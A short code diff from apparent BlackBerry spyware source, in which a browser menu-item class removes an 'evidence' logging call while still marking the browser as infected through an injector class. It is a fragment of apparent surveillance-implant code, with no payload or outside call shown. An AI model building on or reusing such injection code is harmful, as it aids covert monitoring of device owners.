@@ -16,7 +16,6 @@ import net.rim.device.api.ui.UiApplication;
 import blackberry.agent.UrlAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.evidence.Evidence;
 import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
 
@@ -68,8 +67,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 //#ifdef DEBUG
                 debug.trace("run browserScreen: " + browserScreen);
                 //#endif
-
-                Evidence.info("Browser");
+                
                 AppInjectorBrowser.getInstance().setInfected();
             }
 
